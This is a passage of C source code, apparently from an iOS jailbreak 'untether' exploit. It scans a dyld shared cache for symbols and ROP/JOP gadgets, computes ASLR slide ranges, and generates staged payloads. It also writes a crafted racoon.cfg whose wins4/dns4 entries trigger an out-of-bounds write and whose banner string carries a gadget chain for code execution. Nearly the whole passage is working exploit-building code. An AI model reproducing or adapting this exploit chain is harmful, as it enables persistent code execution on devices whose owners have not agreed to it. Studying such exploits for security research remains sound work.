            uint64_t symbol = macho_sym(p + address, sz, p, "_strlcpy");
            assert(symbol);
            call = find_call64(p, symbol - map[0].address, 64);
            assert(call);
            call = find_call64(p, call + 4, 64);
            assert(call);
            stub = follow_call64(p, call);
            assert(stub);
            memmove_lazy = calc64(p, stub, stub + 12, 16);
        }
        if (!strcmp(imgName, "/usr/lib/system/libsystem_kernel.dylib")) {
            sym_open[0] = macho_sym(p + address, sz, p, "_open");
            if (sym_open[0]) {
                num_open = 1;
            }
            sym_mmap[0] = macho_sym(p + address, sz, p, "_mmap");
            if (sym_mmap[0]) {
                num_mmap = 1;
            }
        }
        if (!strcmp(imgName, "/usr/lib/system/libsystem_platform.dylib")) {
            memmove_func = macho_sym(p + address, sz, p, "__platform_memmove");
        }
    }
    assert(memmove_lazy && memmove_func && num_open && num_mmap);
    for (i = 0; i < hdr->imagesCount; i++) {
        uint64_t address = img[i].address;
        address = address - map[0].address + map[0].fileOffset;
        if (num_open < countof(sym_open) - 1) {
            uint64_t stub = macho_stub(p + address, sz, p, map, sym_open[0]);
            if (stub) {
                sym_open[num_open++] = stub;
            }
        }
        if (num_mmap < countof(sym_mmap) - 1) {
            uint64_t stub = macho_stub(p + address, sz, p, map, sym_mmap[0]);
            if (stub) {
                sym_mmap[num_mmap++] = stub;
            }
        }
    }

    printf("__platform_memmove = 0x%llx\n", memmove_func);
    printf("_open: 0x%llx (total %u)\n", sym_open[0], num_open);
    printf("_mmap: 0x%llx (total %u)\n", sym_mmap[0], num_mmap);

    memmove_lazy += map[0].address;
    printf("_memmove_lazy: 0x%llx (rw + 0x%llx)\n", memmove_lazy, memmove_lazy - map[1].address);

    rv = search_gadgets(p, map[0].size);
    assert(rv == 0);

    /*
    preflightCacheFile:
    if ( cache->header.mappingOffset >= 0xf8 ) {
        info->sharedRegionStart = cache->header.sharedRegionStart;
        info->sharedRegionSize  = cache->header.sharedRegionSize;
        info->maxSlide          = cache->header.maxSlide;
    }
    else {
        info->sharedRegionStart = SHARED_REGION_BASE;
        info->sharedRegionSize  = SHARED_REGION_SIZE;
        info->maxSlide          = SHARED_REGION_SIZE - (fileMappings[2].address + fileMappings[2].size - fileMappings[0].address);
    }

    pickCacheASLR:
    long slide = ((arc4random() % info.maxSlide) & (-16384));
    */

    maxSlide = SHARED_REGION_SIZE_ARM64 - (map[2].address + map[2].size - map[0].address);
    if (hdr->mappingOffset >= 0xf8) {
        assert(maxSlide == *(uint64_t *)(p + 0xf0));
    }
    printf("maxSlide: 0x%llx(%llu steps), totalSize: 0x%llx\n", maxSlide, maxSlide / 16384, map[2].address + map[2].size - map[0].address);

    for (i = 0; i < hdr->mappingCount; i++) {
        printf("map%d(%d/%d): 0x%llx - 0x%llx (0x%llx)\n", i, map[i].maxProt, map[i].initProt, map[i].address, map[i].address + map[i].size, map[i].size);
    }

    loSlide = ((0 % maxSlide) & (-16384));
    printf("     zone: 0x%llx - 0x%llx, target=0x%llx, slide=0x%llx\n", map[1].address + loSlide, map1_end + loSlide, memmove_lazy + loSlide, loSlide);

    hiSlide = (((maxSlide - 1) % maxSlide) & (-16384));
    printf("     zone: 0x%llx - 0x%llx, target=0x%llx, slide=0x%llx\n", map[1].address + hiSlide, map1_end + hiSlide, memmove_lazy + hiSlide, hiSlide);

    if (memmove_lazy + hiSlide >= map1_end + loSlide) {
        maxSlide = (map1_end + loSlide - memmove_lazy) & ~0x3FFF;
        fprintf(stderr, "WARNING: data section is not big enough (max safe slide = 0x%llx)\n", maxSlide);
        // XXX I am not exactly sure about this...
        loSlide += (hiSlide - maxSlide) / 2 & ~0x3FFF;
        hiSlide = loSlide + maxSlide;
    }
    printf("loSlide: 0x%llx\n", loSlide);
    printf("hiSlide: 0x%llx\n", hiSlide);

    f = fopen("stage3.bin", "wb");
    assert(f);
    rstrip = build_stage3(map[0].address, sym_open[0], sym_mmap[0], &rsz, &usz);
    fwrite(rstrip, 1, rsz, f);
    free(rstrip);
    fclose(f);

    f = fopen("config2.h", "wt");
    assert(f);
    fprintf(f, "// automatically generated by untether. do not edit\n");
    fprintf(f, "#define FAKE_SHARED_CACHE_SIZE 0x%llx\n", map[0].size);
    fprintf(f, "#define STAGE3_USEFUL_SIZE 0x%zx\n", usz);
    fprintf(f, "extern gadget_pivot_from_10 = 0x%llx;\n", map[0].address + gadgets[19].addr);
    fprintf(f, "extern gadget_jmp_4args = 0x%llx;\n", map[0].address + gadgets[20].addr);
    fprintf(f, "extern gadget_lea_x0_jmp_x8 = 0x%llx;\n", map[0].address + gadgets[21].addr);
    fprintf(f, "extern _platform_memmove_plus4 = 0x%llx;\n", memmove_func + 4);
    fprintf(f, "extern memmove_lazy = 0x%llx; // libsystem_c.dylib memmove lazy pointer\n", memmove_lazy);
    fclose(f);
    f = fopen("config2.asm", "wt");
    assert(f);
    fprintf(f, ";// automatically generated by untether. do not edit\n");
    fprintf(f, "%%define STAGE2_STATIC_ADDRESS	0x%lx\n", STAGE2_STATIC_ADDRESS);
    fprintf(f, "%%define FAKE_SHARED_CACHE_ADDR	0x%lx\n", FAKE_SHARED_CACHE_ADDR);
    fprintf(f, "%%define DYLD_SHARED_CACHE_ADDR	0x%llx\n", map[0].address);
    fprintf(f, "%%define STAGE3_FAKE_OBJECT_SZ	0x%x\n", STAGE3_FAKE_OBJECT_SZ);
    fprintf(f, "%%define STAGE4_STATIC_ADDRESS	0x%lx\n", STAGE4_STATIC_ADDRESS);
    fclose(f);

    f = fopen("racoon.cfg", "wb");
    assert(f);

    fprintf(f, "mode_cfg {\n");

    if (masterSlide + 1) {
        loSlide = masterSlide;
        hiSlide = masterSlide + 0x4000;
    }
    for (slide = hiSlide; slide >= loSlide; slide -= 0x4000) {
        int bad = 0;
        uint64_t gadget_jop = get_ok_addr(p, slide, map, gadgets, 0, &bad);
        rstrip = build_stage1(p, slide, map, sym_open, sym_mmap, &rsz, &bad);
#ifdef BREAKPOINT_0
        gadget_jop = 0x000000016aee620;
#endif
#ifdef BREAKPOINT_1
        *(uint64_t *)(rstrip + 0) = 0x00000000207411a00;
        *(uint64_t *)(rstrip + 8) = 0x4545454545454545;
#endif

#ifdef FORCE_BAD_CHAIN
        bad++;
#endif
        if (bad) {
            uint64_t dst;
            unsigned r_ints = (rsz + 3) / 4;
            unsigned *rp = (unsigned *)rstrip;
            uint64_t gadget_jop2 = get_ok_addr(p, slide, map, gadgets, countof(gadgets) - 1, &bad);
            uint64_t stage1_addr = map1_end + loSlide - ((rsz + 15) & ~15); // XXX this should be computed once
            while (is_bad_addr(stage1_addr)) {
                stage1_addr -= 0x10;
            }
            if (dirty) {
                unsigned char *q = boyermoore_horspool_memmem(rstrip, rsz, (unsigned char *)SHARED_CACHE_NAME, sizeof(SHARED_CACHE_NAME) - 1);
                assert(q);
                r_ints = ((q - rstrip) + 3) / 4; // XXX do not do pathnames again
            }
            fprintf(stderr, "WARNING: (slide = 0x%llx) bad chain, writing to 0x%llx\n", slide, stage1_addr);
            for (i = 0, dst = stage1_addr; i < r_ints; dst += 6 * 4) {
                fprintf(f,
                    "	wins4 5.6.7.8;\n"
                    "	wins4 5.6.7.8;\n"
                    "	wins4 5.6.7.8;\n"
                    "	wins4 5.6.7.8;\n"
                    "	wins4 255.255.255.255;\n"
                    "	wins4 %u.%u.%u.%u;\n"
                    "	dns4 %u.%u.%u.%u;\n"
                    "	dns4 %u.%u.%u.%u;\n"
                    "}\n"
                    "timer {\n",
                    _c4(OOB_WRITE), _c8(dst - WRITE_BIAS));
                if (i < r_ints) fprintf(f, "	counter %u;\n", rp[i++]);
                if (i < r_ints) fprintf(f, "	interval %u sec;\n", rp[i++]);
                if (i < r_ints) fprintf(f, "	persend %u;\n", rp[i++]);
                if (i < r_ints) fprintf(f, "	phase1 %u sec;\n", rp[i++]);
                if (i < r_ints) fprintf(f, "	phase2 %u sec;\n", rp[i++]);
                if (i < r_ints) fprintf(f, "	natt_keepalive %u sec;\n", rp[i++]);
                fprintf(f,
                    "}\n"
                    "mode_cfg {\n");
            }
            assert(!is_bad_addr(gadget_jop));
            *(uint64_t *)(rstrip + 0) = gadget_jop;
            *(uint64_t *)(rstrip + 8) = stage1_addr;
            rsz = 8 * 2;
            gadget_jop = gadget_jop2;
#ifdef BREAKPOINT_0
            gadget_jop = 0x5151515151515151;
#endif
#ifdef BREAKPOINT_1
            *(uint64_t *)(rstrip + 0) = 0x0000000207411a00
            *(uint64_t *)(rstrip + 8) = 0x001ffe1000000000
#endif
            dirty = 1;
        }
        for (i = 0; i < rsz; i++) {
            assert(rstrip[i] != '\"');
        }

        fprintf(f,
            "	wins4 1.2.3.4;\n"
            "	wins4 1.2.3.4;\n"
            "	wins4 1.2.3.4;\n"
            "	wins4 1.2.3.4;\n"
            "	wins4 255.255.255.255;\n"
            "	wins4 %u.%u.%u.%u;\n"
            "	dns4 %u.%u.%u.%u;\n"
            "	dns4 %u.%u.%u.%u;\n"
            "}\n"
            "timer {\n"
            "	counter %u;\n"
            "	interval %u sec;\n"
            "}\n"
            "mode_cfg {\n"
            "	banner \"",
            _c4(OOB_WRITE), _c8(memmove_lazy + slide - WRITE_BIAS), _i2(gadget_jop));

        fwrite(rstrip, 1, rsz, f);

        fprintf(f, "\";\n");

        free(rstrip);
    }

    fprintf(f, "}\n");

    fclose(f);

    return 0;
}

static int
do_the_cache(const char *filename, uint64_t masterSlide)
{
    int rv;
    int fd;
    uint8_t *p;
    off_t sz;

    fd = open(filename, O_RDONLY);
    if (fd < 0) {
        fprintf(stderr, "error: cannot open %s\n", filename);
        return -1;
    }

    sz = lseek(fd, 0, SEEK_END);

    p = mmap(NULL, sz, PROT_READ, MAP_PRIVATE, fd, 0);
    if (p == MAP_FAILED) {
        close(fd);
        fprintf(stderr, "error: cannot map %s\n", filename);
        return -1;
    }

    assert(!memcmp(p, "dyld_v1   arm", 13));
    rv = really(p, sz, masterSlide);

    munmap(p, sz);
    close(fd);

    if (rv != 0) {
        fprintf(stderr, "error: cannot parse %s\n", filename);
        return -1;
    }

    return 0;
}

int
main(int argc, char **argv)
{
    uint64_t masterSlide = -1;
    if (argc < 2) {
        printf("usage: %s cache [slide]\n", argv[0]);
        return 1;
    }
    if (argc > 2) {
        masterSlide = strtoull(argv[2], NULL, 0);
    }
#ifdef FORCE_ALT_PIVOT
    gadgets[1].bytes = gadgets[1].bytes2;
    gadgets[1].length = gadgets[1].length2;
#endif
    return do_the_cache(argv[1], masterSlide);
}
